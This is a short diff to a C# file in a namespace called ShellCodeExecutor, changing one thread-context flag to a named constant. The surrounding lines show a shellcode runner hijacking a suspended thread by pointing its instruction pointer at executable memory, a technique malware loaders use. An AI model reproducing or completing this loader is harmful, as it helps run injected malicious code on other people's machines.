@@ -198,7 +198,7 @@ namespace ShellCodeExecutor
         {
             IntPtr hThread = CreateThread(IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero, 0x00000004, out hThread);
             CONTEXT64 ctx64 = new CONTEXT64();
-            ctx64.ContextFlags = (CONTEXT_FLAGS)0x10001F;
+            ctx64.ContextFlags = CONTEXT_FLAGS.CONTEXT_ALL;
             GetThreadContext(hThread, ref ctx64);
             ctx64.Rip = (ulong)rwxMemory;
             SetThreadContext(hThread, ref ctx64);
